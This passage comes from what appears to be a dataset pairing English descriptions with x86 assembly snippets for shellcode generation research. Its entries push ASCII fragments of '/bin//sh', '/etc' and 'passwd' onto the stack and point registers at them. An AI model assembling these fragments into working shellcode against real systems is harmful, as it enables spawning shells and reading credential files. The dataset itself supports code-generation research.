    "rewritten_intent": "push 0x622f7273 onto the stack",
    "snippet": "push 0x622f7273",
    "slot_map": {
      "0x622f7273": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x622f7273 to the stack",
    "rewritten_intent": "push 0x622f7273 to the stack",
    "snippet": "push 0x622f7273",
    "slot_map": {
      "0x622f7273": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x636e2f2f onto the stack",
    "rewritten_intent": "push 0x636e2f2f onto the stack",
    "snippet": "push 0x636e2f2f",
    "slot_map": {
      "0x636e2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x636e2f2f to the stack",
    "rewritten_intent": "push 0x636e2f2f to the stack",
    "snippet": "push 0x636e2f2f",
    "slot_map": {
      "0x636e2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x636e2f2f onto the stack",
    "rewritten_intent": "push the 0x636e2f2f onto the stack",
    "snippet": "push 0x636e2f2f",
    "slot_map": {
      "0x636e2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6374652f onto the stack",
    "rewritten_intent": "push 0x6374652f onto the stack",
    "snippet": "push 0x6374652f",
    "slot_map": {
      "0x6374652f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6374652f to the stack",
    "rewritten_intent": "push 0x6374652f to the stack",
    "snippet": "push 0x6374652f",
    "slot_map": {
      "0x6374652f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x6374652f onto the stack",
    "rewritten_intent": "push the 0x6374652f onto the stack",
    "snippet": "push 0x6374652f",
    "slot_map": {
      "0x6374652f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6374652f onto the stack and point eax to the stack register",
    "rewritten_intent": "push the value 0x6374652f onto the stack and point eax to the stack register",
    "snippet": "push 0x6374652f \\n mov eax, esp",
    "slot_map": {
      "0x6374652f": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6374652f onto the stack and point ebp to the stack register",
    "rewritten_intent": "push the value 0x6374652f onto the stack and point ebp to the stack register",
    "snippet": "push 0x6374652f \\n mov ebp, esp",
    "slot_map": {
      "0x6374652f": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6374652f onto the stack and point ebx to the stack register",
    "rewritten_intent": "push the value 0x6374652f onto the stack and point ebx to the stack register",
    "snippet": "push 0x6374652f \\n mov ebx, esp",
    "slot_map": {
      "0x6374652f": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6374652f onto the stack and point ecx to the stack register",
    "rewritten_intent": "push the value 0x6374652f onto the stack and point ecx to the stack register",
    "snippet": "push 0x6374652f \\n mov ecx, esp",
    "slot_map": {
      "0x6374652f": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6374652f onto the stack and point edi to the stack register",
    "rewritten_intent": "push the value 0x6374652f onto the stack and point edi to the stack register",
    "snippet": "push 0x6374652f \\n mov edi, esp",
    "slot_map": {
      "0x6374652f": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6374652f onto the stack and point edx to the stack register",
    "rewritten_intent": "push the value 0x6374652f onto the stack and point edx to the stack register",
    "snippet": "push 0x6374652f \\n mov edx, esp",
    "slot_map": {
      "0x6374652f": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6374652f onto the stack and point esi to the stack register",
    "rewritten_intent": "push the value 0x6374652f onto the stack and point esi to the stack register",
    "snippet": "push 0x6374652f \\n mov esi, esp",
    "slot_map": {
      "0x6374652f": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 0x64687373 onto the stack",
    "rewritten_intent": "push 0x64687373 onto the stack",
    "snippet": "push 0x64687373",
    "slot_map": {
      "0x64687373": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x64687373 onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the value 0x64687373 onto the stack and point the eax register to the stack register",
    "snippet": "push 0x64687373 \\n mov eax, esp",
    "slot_map": {
      "0x64687373": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x64687373 onto the stack and point the ebp register to the stack register",
    "rewritten_intent": "push the value 0x64687373 onto the stack and point the ebp register to the stack register",
    "snippet": "push 0x64687373 \\n mov ebp, esp",
    "slot_map": {
      "0x64687373": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x64687373 onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x64687373 onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x64687373 \\n mov ebx, esp",
    "slot_map": {
      "0x64687373": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x64687373 onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the value 0x64687373 onto the stack and point the ecx register to the stack register",
    "snippet": "push 0x64687373 \\n mov ecx, esp",
    "slot_map": {
      "0x64687373": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x64687373 onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push the value 0x64687373 onto the stack and point the edi register to the stack register",
    "snippet": "push 0x64687373 \\n mov edi, esp",
    "slot_map": {
      "0x64687373": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x64687373 onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the value 0x64687373 onto the stack and point the edx register to the stack register",
    "snippet": "push 0x64687373 \\n mov edx, esp",
    "slot_map": {
      "0x64687373": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x64687373 onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push the value 0x64687373 onto the stack and point the esi register to the stack register",
    "snippet": "push 0x64687373 \\n mov esi, esp",
    "slot_map": {
      "0x64687373": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push 0x6475732f onto the stack",
    "rewritten_intent": "push 0x6475732f onto the stack",
    "snippet": "push 0x6475732f",
    "slot_map": {
      "0x6475732f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6475732f to the stack",
    "rewritten_intent": "push 0x6475732f to the stack",
    "snippet": "push 0x6475732f",
    "slot_map": {
      "0x6475732f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x6475732f onto the stack",
    "rewritten_intent": "push the 0x6475732f onto the stack",
    "snippet": "push 0x6475732f",
    "slot_map": {
      "0x6475732f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register",
    "snippet": "push 0x6475732f \\n push 0x6374652f \\n mov eax, esp",
    "slot_map": {
      "0x6475732f": "var0",
      "0x6374652f": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x6475732f \\n push 0x6374652f \\n mov ebx, esp",
    "slot_map": {
      "0x6475732f": "var0",
      "0x6374652f": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register",
    "snippet": "push 0x6475732f \\n push 0x6374652f \\n mov ecx, esp",
    "slot_map": {
      "0x6475732f": "var0",
      "0x6374652f": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register",
    "snippet": "push 0x6475732f \\n push 0x6374652f \\n mov edi, esp",
    "slot_map": {
      "0x6475732f": "var0",
      "0x6374652f": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the edx register to the stack register",
    "snippet": "push 0x6475732f \\n push 0x6374652f \\n mov edx, esp",
    "slot_map": {
      "0x6475732f": "var0",
      "0x6374652f": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register",
    "snippet": "push 0x6475732f \\n push 0x6374652f \\n mov esi, esp",
    "slot_map": {
      "0x6475732f": "var0",
      "0x6374652f": "var1",
      "esi": "var2"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "and",
      "value",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "var0",
      "\\n",
      "push",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the 0x64777373 onto the stack",
    "rewritten_intent": "push the 0x64777373 onto the stack",
    "snippet": "push 0x64777373",
    "slot_map": {
      "0x64777373": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x64777373 onto the stack",
    "rewritten_intent": "push 0x64777373 onto the stack",
    "snippet": "push 0x64777373",
    "slot_map": {
      "0x64777373": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6567772f onto the stack",
    "rewritten_intent": "push 0x6567772f onto the stack",
    "snippet": "push 0x6567772f",
    "slot_map": {
      "0x6567772f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6567772f to the stack",
    "rewritten_intent": "push 0x6567772f to the stack",
    "snippet": "push 0x6567772f",
    "slot_map": {
      "0x6567772f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x656c6966 onto the stack",
    "rewritten_intent": "push 0x656c6966 onto the stack",
    "snippet": "push 0x656c6966",
    "slot_map": {
      "0x656c6966": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x656c6966 onto the stack",
    "rewritten_intent": "push the 0x656c6966 onto the stack",
    "snippet": "push 0x656c6966",
    "slot_map": {
      "0x656c6966": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x65726f43 onto the stack",
    "rewritten_intent": "push 0x65726f43 onto the stack",
    "snippet": "push 0x65726f43",
    "slot_map": {
      "0x65726f43": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x65782e2f onto the stack",
    "rewritten_intent": "push 0x65782e2f onto the stack",
    "snippet": "push 0x65782e2f",
    "slot_map": {
      "0x65782e2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x65782e2f to the stack",
    "rewritten_intent": "push 0x65782e2f to the stack",
    "snippet": "push 0x65782e2f",
    "slot_map": {
      "0x65782e2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x66 onto the stack",
    "rewritten_intent": "push 0x66 onto the stack",
    "snippet": "push 0x66",
    "slot_map": {
      "0x66": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x66 to the stack",
    "rewritten_intent": "push 0x66 to the stack",
    "snippet": "push 0x66",
    "slot_map": {
      "0x66": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x66 onto the stack",
    "rewritten_intent": "push the 0x66 onto the stack",
    "snippet": "push 0x66",
    "slot_map": {
      "0x66": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x67513231 onto the stack",
    "rewritten_intent": "push 0x67513231 onto the stack",
    "snippet": "push 0x67513231",
    "slot_map": {
      "0x67513231": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x6769666e onto the stack",
    "rewritten_intent": "push 0x6769666e onto the stack",
    "snippet": "push 0x6769666e",
    "slot_map": {
      "0x6769666e": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x682f2f2f onto the stack",
    "rewritten_intent": "push 0x682f2f2f onto the stack",
    "snippet": "push 0x682f2f2f",
    "slot_map": {
      "0x682f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the 0x682f2f2f value onto the stack",
    "rewritten_intent": "push the 0x682f2f2f value onto the stack",
    "snippet": "push 0x682f2f2f",
    "slot_map": {
      "0x682f2f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "value",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push //sh to the stack",
    "rewritten_intent": "push //sh to the stack",
    "snippet": "push 0x68732f2f",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "//sh",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f"
    ]
  },
  {
    "intent": "push ascii sh// onto stack",
    "rewritten_intent": "push ascii sh// onto stack",
    "snippet": "push 0x68732f2f",
    "slot_map": {
      "sh//": "var0"
    },
    "intent_tokens": [
      "push",
      "ascii",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f"
    ]
  },
  {
    "intent": "push hs//",
    "rewritten_intent": "push hs//",
    "snippet": "push 0x68732f2f",
    "slot_map": {
      "hs//": "var0"
    },
    "intent_tokens": [
      "push",
      "var0"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f"
    ]
  },
  {
    "intent": "push the 0x68732f2f value onto the stack",
    "rewritten_intent": "push the 0x68732f2f value onto the stack",
    "snippet": "push 0x68732f2f",
    "slot_map": {
      "0x68732f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "value",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push the value 0x68732f2f onto the stack",
    "rewritten_intent": "push the value 0x68732f2f onto the stack",
    "snippet": "push 0x68732f2f",
    "slot_map": {
      "0x68732f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "value",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x68732f2f to the stack",
    "rewritten_intent": "push 0x68732f2f to the stack",
    "snippet": "push 0x68732f2f",
    "slot_map": {
      "0x68732f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push 0x68732f2f onto the stack",
    "rewritten_intent": "push 0x68732f2f onto the stack",
    "snippet": "push 0x68732f2f",
    "slot_map": {
      "0x68732f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "var0"
    ]
  },
  {
    "intent": "push /bin/sh onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push /bin/sh onto the stack and point the eax register to the stack register",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov eax, esp",
    "slot_map": {
      "push /bin/sh": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move /bin/sh into eax",
    "rewritten_intent": "move /bin/sh into eax",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov eax, esp",
    "slot_map": {
      "move /bin/sh": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "put ASCII /bin/sh into eax",
    "rewritten_intent": "put ASCII /bin/sh into eax",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov eax, esp",
    "slot_map": {
      "ASCII /bin/sh": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move /bin/sh into the eax register",
    "rewritten_intent": "move /bin/sh into the eax register",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov eax, esp",
    "slot_map": {
      "move /bin/sh": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push ASCII /bin/sh onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push ASCII /bin/sh onto the stack and point the ebx register to the stack register",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov ebx, esp",
    "slot_map": {
      "ASCII /bin/sh": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "put /bin/sh into ebx",
    "rewritten_intent": "put /bin/sh into ebx",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov ebx, esp",
    "slot_map": {
      "put /bin/sh": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move ASCII /bin/sh into ebx",
    "rewritten_intent": "move ASCII /bin/sh into ebx",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov ebx, esp",
    "slot_map": {
      "ASCII /bin/sh": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move /bin/sh into the ebx register",
    "rewritten_intent": "move /bin/sh into the ebx register",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov ebx, esp",
    "slot_map": {
      "move /bin/sh": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move ASCII /bin/sh into ecx",
    "rewritten_intent": "move ASCII /bin/sh into ecx",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov ecx, esp",
    "slot_map": {
      "ASCII /bin/sh": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move /bin/sh into the ecx register",
    "rewritten_intent": "move /bin/sh into the ecx register",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov ecx, esp",
    "slot_map": {
      "move /bin/sh": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push /bin/sh onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push /bin/sh onto the stack and point the ecx register to the stack register",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov ecx, esp",
    "slot_map": {
      "push /bin/sh": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "put /bin/sh into ecx",
    "rewritten_intent": "put /bin/sh into ecx",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov ecx, esp",
    "slot_map": {
      "put /bin/sh": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push ASCII /bin/sh onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push ASCII /bin/sh onto the stack and point the edx register to the stack register",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov edx, esp",
    "slot_map": {
      "ASCII /bin/sh": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "push",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "put /bin/sh into edx",
    "rewritten_intent": "put /bin/sh into edx",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov edx, esp",
    "slot_map": {
      "put /bin/sh": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "push",
      "0x68732f2f",
      "\\n",
      "push",
      "0x6e69622f",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move ASCII /bin/sh into edx",
    "rewritten_intent": "move ASCII /bin/sh into edx",
    "snippet": "push 0x68732f2f \\n push 0x6e69622f \\n mov edx, esp",
    "slot_map": {
